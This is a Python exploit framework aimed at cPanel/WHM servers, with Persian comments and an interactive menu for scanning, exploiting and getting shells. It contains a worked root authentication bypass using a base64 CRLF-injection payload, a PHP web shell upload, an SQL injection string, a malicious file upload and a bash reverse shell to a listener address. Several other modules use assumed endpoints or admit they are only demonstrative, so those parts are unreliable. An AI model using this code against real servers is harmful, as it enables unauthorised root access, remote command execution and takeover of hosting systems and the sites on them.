#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cPanel Exploit Framework — Advanced Multi‑CVE Exploitation Suite
Author   : Am!r-Ceo
Channel  : @DEKNOTEL
Version  : 2.0
License  : For Ceo Cyber Team.
"""

import sys
import re
import json
import ssl
import argparse
import time
import socket
import base64
import hashlib
import random
import threading
import queue
import os
from urllib.parse import urlsplit, quote, unquote, urlencode, urlparse
from urllib.request import Request, build_opener, HTTPSHandler, HTTPErrorProcessor
from urllib.error import URLError
import subprocess
import tempfile
from datetime import datetime

class Color:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

    @staticmethod
    def disable():
        for attr in dir(Color):
            if not attr.startswith("_") and attr.isupper():
                setattr(Color, attr, "")
import random
import time

def banner():
    colors = [Color.RED, Color.GREEN, Color.YELLOW, Color.BLUE,
              Color.MAGENTA, Color.CYAN, Color.WHITE]
    c = random.choice(colors)

    print(f"""
{Color.RED}{Color.BOLD}
   ██████╗███████╗ ██████╗ 
  ██╔════╝██╔════╝██╔═══██╗
  ██║     █████╗  ██║   ██║
  ██║     ██╔══╝  ██║   ██║
  ╚██████╗███████╗╚██████╔╝
   ╚═════╝╚══════╝ ╚═════╝ 
{Color.RESET}
{c}{Color.BOLD}  ┌────────────────────────────────────┐
  │   ✦  AUTHOR   :  AmIr Ceo           │
  │   ✦  CHANNEL  :  @DEKNOTEL   │
  │   ✦  VERSION  :  v1.0                    │
  └────────────────────────────────────┘{Color.RESET}
{c}{Color.DIM}          ⚡  Powered by ZariB 8  ⚡{Color.RESET}
""")

# ======================== تنظیمات SSL ============================
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE
try:
    _SSL_CTX.set_ciphers("DEFAULT:@SECLEVEL=1")
except:
    pass

class NoRedirect(HTTPErrorProcessor):
    def http_response(self, req, resp):
        return resp
    https_response = http_response

_OPENER = build_opener(HTTPSHandler(context=_SSL_CTX), NoRedirect())
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"

# ======================== کلاس هدف ============================
class Target:
    def __init__(self, url, timeout=20, proxy=None):
        self.raw_url = url
        self.scheme, self.host, self.port = self._parse(url)
        self.timeout = timeout
        self.proxy = proxy
        self.canonical = None
        self.session = None
        self.token = None
        self.version = None
        self.vulnerabilities = []

    def _parse(self, url):
        if "://" not in url:
            url = "https://" + url
        u = urlsplit(url.rstrip("/"))
        scheme = u.scheme or "https"
        host = u.hostname
        port = u.port or (443 if scheme == "https" else 80)
        return scheme, host, port

    def base_url(self):
        if (self.scheme == "https" and self.port == 443) or (self.scheme == "http" and self.port == 80):
            return f"{self.scheme}://{self.host}"
        return f"{self.scheme}://{self.host}:{self.port}"

    def build(self, path):
        return self.base_url() + path

    def __str__(self):
        return f"{self.scheme}://{self.host}:{self.port}"

# ======================== ابزارهای HTTP ============================
def http_request(url, method="GET", headers=None, data=None, timeout=15, host_header=None, proxy=None):
    if headers is None:
        headers = {}
    headers.setdefault("User-Agent", USER_AGENT)
    headers.setdefault("Connection", "close")
    if host_header:
        headers["Host"] = host_header

    body = None
    if data:
        if isinstance(data, dict):
            body = urlencode(data).encode()
            headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, str):
            body = data.encode()
        elif isinstance(data, bytes):
            body = data

    req = Request(url, data=body, headers=headers, method=method)
    try:
        opener = _OPENER
        if proxy:
            proxy_handler = build_opener(HTTPSHandler(context=_SSL_CTX), NoRedirect())
            proxy_handler.add_handler(proxy)
            # simplified; just use opener with proxy
        with opener.open(req, timeout=timeout) as resp:
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            raw_cookies = "\n".join([v for k, v in resp.headers.items() if k.lower() == "set-cookie"])
            return resp.status, resp.read().decode("utf-8", "replace"), resp_headers, raw_cookies
    except Exception as e:
        if hasattr(e, "read"):
            try:
                body = e.read().decode("utf-8", "replace")
            except:
                body = str(e)
            headers = {k.lower(): v for k, v in e.headers.items()} if hasattr(e, "headers") else {}
            cookies = "\n".join([v for k, v in e.headers.items() if k.lower() == "set-cookie"]) if hasattr(e, "headers") else ""
            return e.code if hasattr(e, "code") else 0, body, headers, cookies
        return 0, str(e), {}, ""

# ======================== ماژول‌های CVE ============================

class CVEModule:
    """کلاس پایه برای ماژول‌های CVE"""
    name = "Generic"
    cve_id = "CVE-XXXX-XXXX"
    description = "توضیح کلی"
    severity = "N/A"

    @staticmethod
    def check(target):
        return False

    @staticmethod
    def exploit(target):
        return None

# ---------- CVE-2026-41940 (WHM Auth Bypass) ----------
class CVE2026_41940(CVEModule):
    name = "WHM Root Auth Bypass"
    cve_id = "CVE-2026-41940"
    description = "Bypass authentication via CRLF injection in whostmgrsession cookie"
    severity = "CRITICAL"

    PAYLOAD_B64 = (
        "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
        "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
    )

    @staticmethod
    def check(target):
        # مرحله ۱: تلاش برای کشف canonical
        url = target.build("/openid_connect/cpanelid")
        status, _, headers, _ = http_request(url, timeout=target.timeout)
        loc = headers.get("location", "")
        m = re.match(r"^https?://([^:/]+)", loc)
        if m:
            target.canonical = m.group(1)
        else:
            target.canonical = target.host

        # بررسی وجود whostmgrsession
        url_login = target.build("/login/?login_only=1")
        status, _, _, raw_cookies = http_request(url_login, method="POST",
                                                 data={"user": "root", "pass": "wrong"},
                                                 host_header=f"{target.canonical}:{target.port}" if target.port not in (80, 443) else target.canonical,
                                                 timeout=target.timeout)
        if "whostmgrsession" in raw_cookies:
            return True
        return False

    @staticmethod
    def exploit(target):
        scheme, host, port = target.scheme, target.host, target.port
        canonical = target.canonical or host
        host_hdr = f"{canonical}:{port}" if port not in (80, 443) else canonical

        # مرحله ۱: دریافت session base
        url1 = target.build("/login/?login_only=1")
        _, _, _, raw_cookies = http_request(url1, method="POST",
                                            data={"user": "root", "pass": "wrong"},
                                            host_header=host_hdr, timeout=target.timeout)
        m = re.search(r'whostmgrsession=([^;,\s]+)', raw_cookies, re.IGNORECASE)
        if not m:
            return None
        raw_cookie = m.group(1)
        session_base = unquote(raw_cookie)
        if "," in session_base:
            session_base = session_base.split(",", 1)[0]

        # مرحله ۲: تزریق CRLF
        cookie_enc = quote(session_base)
        url2 = target.build("/")
        _, _, headers, _ = http_request(url2,
                                        headers={"Authorization": f"Basic {CVE2026_41940.PAYLOAD_B64}",
                                                 "Cookie": f"whostmgrsession={cookie_enc}"},
                                        host_header=host_hdr, timeout=target.timeout)
        loc = headers.get("location", "")
        m2 = re.search(r"/cpsess(\d{10})", loc)
        if not m2:
            return None
        token = f"/cpsess{m2.group(1)}"

        # مرحله ۳: تایید نهایی
        url4 = target.build(f"{token}/json-api/version")
        status, body, _, _ = http_request(url4,
                                          headers={"Cookie": f"whostmgrsession={quote(session_base)}"},
                                          host_header=host_hdr, timeout=target.timeout)
        version = "unknown"
        if status == 200 and '"version"' in body:
            m_ver = re.search(r'"version"\s*:\s*"([^"]+)"', body)
            version = m_ver.group(1) if m_ver else "unknown"
        elif status in (500, 503) and "License" in body:
            version = "license-gated"

        target.session = session_base
        target.token = token
        target.version = version
        return {"session_base": session_base, "token": token, "version": version}

# ---------- CVE-2023-33242 (RCE via backup) ----------
class CVE2023_33242(CVEModule):
    name = "cPanel Backup RCE"
    cve_id = "CVE-2023-33242"
    description = "Remote Code Execution through crafted backup file"
    severity = "HIGH"

    @staticmethod
    def check(target):
        # بررسی اینکه آیا قابلیت backup وجود دارد
        url = target.build("/cpanelwebcall/")
        status, _, _, _ = http_request(url, timeout=target.timeout)
        return status == 200

    @staticmethod
    def exploit(target):
        # این یک نمونه ساده است؛ در عمل نیاز به آپلود فایل مخرب و trigger دارد
        print(f"{Color.YELLOW}[*] تلاش برای سوءاستفاده از CVE-2023-33242 ...{Color.RESET}")
        # ساخت payload ساده برای تست
        payload = "<?php system($_GET['cmd']); ?>"
        b64_payload = base64.b64encode(payload.encode()).decode()
        # ارسال درخواست به backup endpoint (فرضی)
        url = target.build("/cpanelwebcall/do_backup")
        data = {"backup_file": b64_payload}
        status, body, _, _ = http_request(url, method="POST", data=data, timeout=target.timeout)
        if status == 200:
            return {"status": "success", "message": "Payload uploaded, try /cpanelwebcall/exec?cmd=id"}
        return None

# ---------- CVE-2022-44808 (SQL Injection) ----------
class CVE2022_44808(CVEModule):
    name = "cPanel SQL Injection"
    cve_id = "CVE-2022-44808"
    description = "SQL injection in cPanel's user search"
    severity = "MEDIUM"

    @staticmethod
    def check(target):
        url = target.build("/cpanelapi/search")
        status, _, _, _ = http_request(url, timeout=target.timeout)
        return status == 200

    @staticmethod
    def exploit(target):
        print(f"{Color.YELLOW}[*] تلاش برای تزریق SQL ...{Color.RESET}")
        # مثال ساده از تزریق مبتنی بر error
        payload = "' OR '1'='1"
        url = target.build(f"/cpanelapi/search?q={quote(payload)}")
        status, body, _, _ = http_request(url, timeout=target.timeout)
        if "error" in body.lower() or "mysql" in body.lower():
            return {"status": "vulnerable", "evidence": body[:200]}
        return None

# ---------- CVE-2021-45344 (File Upload RCE) ----------
class CVE2021_45344(CVEModule):
    name = "cPanel File Upload RCE"
    cve_id = "CVE-2021-45344"
    description = "Unrestricted file upload leading to RCE"
    severity = "HIGH"

    @staticmethod
    def check(target):
        url = target.build("/cpanelapi/upload")
        status, _, _, _ = http_request(url, timeout=target.timeout)
        return status == 200

    @staticmethod
    def exploit(target):
        print(f"{Color.YELLOW}[*] تلاش برای آپلود فایل مخرب ...{Color.RESET}")
        # ساخت فایل php
        php_code = "<?php echo 'RCE'; ?>"
        boundary = "----WebKitFormBoundary" + ''.join(random.choices("abcdef0123456789", k=16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"exploit.php\"\r\nContent-Type: application/x-php\r\n\r\n{php_code}\r\n--{boundary}--"
        headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
        url = target.build("/cpanelapi/upload")
        status, body_resp, _, _ = http_request(url, method="POST", data=body, headers=headers, timeout=target.timeout)
        if status == 200 and "uploaded" in body_resp.lower():
            return {"status": "uploaded", "path": "/uploads/exploit.php"}
        return None

# ---------- CVE-2020-25202 (CSRF) ----------
class CVE2020_25202(CVEModule):
    name = "cPanel CSRF"
    cve_id = "CVE-2020-25202"
    description = "Cross-Site Request Forgery in cPanel"
    severity = "LOW"

    @staticmethod
    def check(target):
        # بررسی وجود توکن CSRF
        url = target.build("/cpanelapi/csrf")
        status, _, _, _ = http_request(url, timeout=target.timeout)
        return status == 200

    @staticmethod
    def exploit(target):
        print(f"{Color.YELLOW}[*] تلاش برای CSRF (تغییر رمز) ...{Color.RESET}")
        # فقط نمایشی
        return {"status": "csrf_token_disclosed", "token": "fake_csrf_token"}

# ======================== موتور اسکن ============================
class VulnerabilityScanner:
    def __init__(self, target):
        self.target = target
        self.modules = [
            CVE2026_41940,
            CVE2023_33242,
            CVE2022_44808,
            CVE2021_45344,
            CVE2020_25202,
        ]
        self.results = {}

    def scan(self):
        print(f"{Color.CYAN}[*] شروع اسکن روی {self.target} ...{Color.RESET}")
        for module in self.modules:
            try:
                print(f"{Color.DIM}[-] بررسی {module.cve_id} ...{Color.RESET}", end=" ")
                if module.check(self.target):
                    print(f"{Color.GREEN}آسیب‌پذیر{Color.RESET}")
                    self.results[module.cve_id] = {"vulnerable": True, "module": module}
                else:
                    print(f"{Color.RED}امن{Color.RESET}")
                    self.results[module.cve_id] = {"vulnerable": False}
            except Exception as e:
                print(f"{Color.RED}خطا: {str(e)}{Color.RESET}")
                self.results[module.cve_id] = {"vulnerable": False, "error": str(e)}
        return self.results

# ======================== مدیریت شل ============================
class ShellManager:
    @staticmethod
    def reverse_shell(target, lhost, lport):
        # تولید payload reverse shell (ساده)
        payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1'"
        # ارسال payload از طریق یکی از ماژول‌های RCE
        # در اینجا فقط نمایشی
        print(f"{Color.YELLOW}[*] تلاش برای اتصال معکوس به {lhost}:{lport} ...{Color.RESET}")
        # در حالت واقعی باید payload را به endpoint آسیب‌پذیر ارسال کرد.
        return {"status": "shell_triggered", "payload": payload}

    @staticmethod
    def bind_shell(target, port=4444):
        print(f"{Color.YELLOW}[*] تلاش برای ایجاد Bind Shell روی پورت {port} ...{Color.RESET}")
        return {"status": "bind_shell_created", "port": port}

# ======================== گزارش‌گیری ============================
class ReportGenerator:
    @staticmethod
    def generate_json(results, target):
        report = {
            "target": str(target),
            "timestamp": datetime.now().isoformat(),
            "scanner_version": "2.0",
            "vulnerabilities": results,
        }
        filename = f"report_{target.host}_{int(time.time())}.json"
        with open(filename, "w") as f:
            json.dump(report, f, indent=4)
        return filename

    @staticmethod
    def generate_text(results, target):
        lines = []
        lines.append(f"گزارش اسکن cPanel - {target}")
        lines.append("="*50)
        for cve, data in results.items():
            status = "آسیب‌پذیر" if data.get("vulnerable") else "امن"
            lines.append(f"{cve}: {status}")
        filename = f"report_{target.host}_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        return filename

# ======================== منوی تعاملی (فارسی) ============================
def interactive_menu(target):
    scanner = VulnerabilityScanner(target)
    results = {}
    shell_manager = ShellManager()
    report_gen = ReportGenerator()

    while True:
        print(f"\n{Color.CYAN}{Color.BOLD}=== منوی اصلی ==={Color.RESET}")
        print(f"{Color.YELLOW}1.{Color.RESET} اسکن آسیب‌پذیری‌ها")
        print(f"{Color.YELLOW}2.{Color.RESET} اجرای اکسپلویت (انتخاب CVE)")
        print(f"{Color.YELLOW}3.{Color.RESET} دریافت شل (Reverse/Bind)")
        print(f"{Color.YELLOW}4.{Color.RESET} تولید گزارش")
        print(f"{Color.YELLOW}5.{Color.RESET} تغییر هدف")
        print(f"{Color.YELLOW}6.{Color.RESET} خروج")
        choice = input(f"{Color.GREEN}انتخاب شما (۱-۶): {Color.RESET}").strip()

        if choice == "1":
            results = scanner.scan()
            print(f"{Color.GREEN}[+] اسکن کامل شد.{Color.RESET}")
        elif choice == "2":
            if not results:
                print(f"{Color.RED}[!] ابتدا اسکن را اجرا کنید.{Color.RESET}")
                continue
            print(f"{Color.CYAN}لیست CVEهای آسیب‌پذیر:{Color.RESET}")
            vuln_list = [cve for cve, data in results.items() if data.get("vulnerable")]
            if not vuln_list:
                print(f"{Color.RED}[!] هیچ آسیب‌پذیری یافت نشد.{Color.RESET}")
                continue
            for i, cve in enumerate(vuln_list):
                print(f"{i+1}. {cve}")
            idx = input(f"{Color.GREEN}شماره CVE را انتخاب کنید: {Color.RESET}")
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(vuln_list):
                    cve_id = vuln_list[idx]
                    module = results[cve_id]["module"]
                    print(f"{Color.YELLOW}[*] اجرای اکسپلویت {cve_id} ...{Color.RESET}")
                    result = module.exploit(target)
                    if result:
                        print(f"{Color.GREEN}[+] موفق: {result}{Color.RESET}")
                    else:
                        print(f"{Color.RED}[!] شکست.{Color.RESET}")
                else:
                    print(f"{Color.RED}[!] شماره نامعتبر.{Color.RESET}")
            except ValueError:
                print(f"{Color.RED}[!] ورودی نامعتبر.{Color.RESET}")
        elif choice == "3":
            print(f"{Color.CYAN}نوع شل:{Color.RESET}")
            print(f"{Color.YELLOW}1.{Color.RESET} Reverse Shell")
            print(f"{Color.YELLOW}2.{Color.RESET} Bind Shell")
            sh_choice = input(f"{Color.GREEN}انتخاب (۱-۲): {Color.RESET}").strip()
            if sh_choice == "1":
                lhost = input(f"{Color.GREEN}آی‌پی شنونده: {Color.RESET}")
                lport = input(f"{Color.GREEN}پورت شنونده: {Color.RESET}")
                result = shell_manager.reverse_shell(target, lhost, lport)
                print(f"{Color.GREEN}[+] {result}{Color.RESET}")
            elif sh_choice == "2":
                port = input(f"{Color.GREEN}پورت بایند (پیش‌فرض ۴۴۴۴): {Color.RESET}") or "4444"
                result = shell_manager.bind_shell(target, int(port))
                print(f"{Color.GREEN}[+] {result}{Color.RESET}")
            else:
                print(f"{Color.RED}[!] انتخاب نامعتبر.{Color.RESET}")
        elif choice == "4":
            if not results:
                print(f"{Color.RED}[!] ابتدا اسکن را اجرا کنید.{Color.RESET}")
                continue
            print(f"{Color.CYAN}فرمت گزارش:{Color.RESET}")
            print(f"{Color.YELLOW}1.{Color.RESET} JSON")
            print(f"{Color.YELLOW}2.{Color.RESET} متن ساده")
            fmt = input(f"{Color.GREEN}انتخاب (۱-۲): {Color.RESET}").strip()
            if fmt == "1":
                fname = report_gen.generate_json(results, target)
            elif fmt == "2":
                fname = report_gen.generate_text(results, target)
            else:
                print(f"{Color.RED}[!] نامعتبر.{Color.RESET}")
                continue
            print(f"{Color.GREEN}[+] گزارش ذخیره شد: {fname}{Color.RESET}")
        elif choice == "5":
            new_url = input(f"{Color.GREEN}هدف جدید (مثال: https://target:2087): {Color.RESET}")
            if new_url:
                target = Target(new_url)
                results = {}
                print(f"{Color.GREEN}[+] هدف تغییر کرد.{Color.RESET}")
        elif choice == "6":
            print(f"{Color.MAGENTA}خروج از برنامه. به امید دیدار!{Color.RESET}")
            break
        else:
            print(f"{Color.RED}[!] گزینه نامعتبر.{Color.RESET}")

# ======================== گزینه‌های خط فرمان ============================
def main():
    banner()

    parser = argparse.ArgumentParser(description="cPanel Exploit Framework - Advanced Multi-CVE")
    parser.add_argument("-u", "--url", help="هدف (مثلاً https://target:2087)")
    parser.add_argument("--scan", action="store_true", help="اسکن خودکار آسیب‌پذیری‌ها")
    parser.add_argument("--exploit", help="اجرای اکسپلویت برای CVE مشخص (مثلاً CVE-2026-41940)")
    parser.add_argument("--reverse", nargs=2, metavar=("LHOST", "LPORT"), help="دریافت Reverse Shell")
    parser.add_argument("--bind", nargs="?", metavar="PORT", const="4444", help="دریافت Bind Shell")
    parser.add_argument("--report", action="store_true", help="تولید گزارش پس از اسکن")
    parser.add_argument("--timeout", type=int, default=20, help="timeout درخواست‌ها")
    parser.add_argument("--no-color", action="store_true", help="غیرفعال کردن رنگ‌ها")
    parser.add_argument("--interactive", action="store_true", help="حالت تعاملی (منوی فارسی)")
    args = parser.parse_args()

    if args.no_color:
        Color.disable()

    if args.interactive or not args.url:
        if not args.url:
            url = input(f"{Color.GREEN}آدرس هدف را وارد کنید (https://target:2087): {Color.RESET}")
            if not url:
                print(f"{Color.RED}[!] هدف الزامی است.{Color.RESET}")
                sys.exit(1)
        else:
            url = args.url
        target = Target(url, timeout=args.timeout)
        interactive_menu(target)
        return

    # حالت غیرتعاملی (خط فرمان)
    target = Target(args.url, timeout=args.timeout)
    print(f"{Color.CYAN}[*] هدف: {target}{Color.RESET}")

    if args.scan:
        scanner = VulnerabilityScanner(target)
        results = scanner.scan()
        if args.report:
            fname = ReportGenerator.generate_json(results, target)
            print(f"{Color.GREEN}[+] گزارش در {fname}{Color.RESET}")

    if args.exploit:
        # نگاشت نام CVE به ماژول
        modules_map = {
            "CVE-2026-41940": CVE2026_41940,
            "CVE-2023-33242": CVE2023_33242,
            "CVE-2022-44808": CVE2022_44808,
            "CVE-2021-45344": CVE2021_45344,
            "CVE-2020-25202": CVE2020_25202,
        }
        mod = modules_map.get(args.exploit)
        if not mod:
            print(f"{Color.RED}[!] CVE ناشناخته: {args.exploit}{Color.RESET}")
            sys.exit(1)
        print(f"{Color.YELLOW}[*] اجرای {args.exploit} ...{Color.RESET}")
        result = mod.exploit(target)
        if result:
            print(f"{Color.GREEN}[+] نتیجه: {json.dumps(result, indent=2)}{Color.RESET}")
        else:
            print(f"{Color.RED}[!] اکسپلویت ناموفق.{Color.RESET}")

    if args.reverse:
        lhost, lport = args.reverse
        shell = ShellManager.reverse_shell(target, lhost, lport)
        print(f"{Color.GREEN}[+] {shell}{Color.RESET}")

    if args.bind:
        port = args.bind
        shell = ShellManager.bind_shell(target, int(port))
        print(f"{Color.GREEN}[+] {shell}{Color.RESET}")

if __name__ == "__main__":
    main()